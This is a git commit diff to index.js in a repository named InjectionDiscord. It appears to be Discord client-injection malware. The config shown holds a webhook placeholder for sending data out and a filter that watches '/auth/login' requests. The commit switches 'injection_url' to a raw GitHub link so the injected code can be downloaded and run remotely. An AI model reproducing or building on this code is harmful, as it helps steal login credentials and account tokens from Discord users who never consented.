5b996b6bcb7c560bc77f81f70dd08cef904797d2
ZekromDev <108199641+ZekromDev@users.noreply.github.com>
2024-01-16 22:13:06 +0100

    Update index.js
    Update index.js

--- index.js
+++ index.js
@@ -12,7 +12,7 @@ const {
 
 const CONFIG = {
     webhook: "%WEBHOOK%",
-    injection_url: "https://github.com/ZekromDev/InjectionDiscord/edit/main/index.js",
+    injection_url: "https://raw.githubusercontent.com/ZekromDev/InjectionDiscord/main/index.js",
     filters: {
         urls: [
             '/auth/login',
